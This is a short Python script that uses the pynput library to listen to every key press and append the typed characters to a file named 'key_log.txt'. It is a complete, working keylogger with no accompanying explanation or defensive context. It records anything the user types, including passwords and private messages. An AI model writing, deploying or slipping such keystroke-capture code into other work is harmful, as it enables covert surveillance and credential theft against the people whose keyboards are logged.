from pynput.keyboard import Listener

def write_to_file(key):
    key=str(key).replace("'","")
    if "Key" in key:
        return 

    #append
    with open("key_log.txt","a") as f: 
        f.write(key)

with Listener(on_press=write_to_file) as listener:
    listener.join()